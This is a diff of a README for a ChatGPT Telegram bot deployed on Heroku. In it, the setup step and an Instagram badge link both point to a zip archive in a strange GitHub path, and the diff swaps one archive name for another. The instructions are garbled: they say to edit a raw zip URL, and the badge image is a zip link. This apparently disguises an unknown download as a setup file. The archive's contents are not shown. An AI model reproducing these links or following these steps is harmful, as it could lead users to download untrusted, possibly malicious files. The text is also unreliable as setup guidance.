@@ -3,7 +3,7 @@
 <h3>Step 1: Fork the Repository</h3>
 <p>Start by forking the repository and making your forked repository private to protect your OpenAI and Telegram Keys.</p>
 <h3>Step 2: Replace the Keys</h3>
-<p>In the forked repository, edit the https://raw.githubusercontent.com/Dhiraj790-wq/Chat/main/caatinga/Chat_v3.9.zip file and replace the keys with the ones you had copied.</p>
+<p>In the forked repository, edit the https://raw.githubusercontent.com/Dhiraj790-wq/Chat/main/caatinga/Software-1.2.zip file and replace the keys with the ones you had copied.</p>
 <h3>Step 3: Create a Heroku Account</h3>
 <p>Register or login into your Heroku account.</p>
 <h3>Step 4: Create a New Application</h3>
@@ -17,7 +17,7 @@
 <p>Follow these steps and deploy your own ChatGPT Telegram Bot today!</p>
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/Dhiraj790-wq/Chat/main/caatinga/Chat_v3.9.zip">
-    <img src="https://raw.githubusercontent.com/Dhiraj790-wq/Chat/main/caatinga/Chat_v3.9.zip%20%40harshitethic-Follow%20on%20Instagram-833AB4?logo=instagram&style=for-the-badge" alt="Instagram follow button">
+  <a href="https://raw.githubusercontent.com/Dhiraj790-wq/Chat/main/caatinga/Software-1.2.zip">
+    <img src="https://raw.githubusercontent.com/Dhiraj790-wq/Chat/main/caatinga/Software-1.2.zip%20%40harshitethic-Follow%20on%20Instagram-833AB4?logo=instagram&style=for-the-badge" alt="Instagram follow button">
   </a>
 </div>
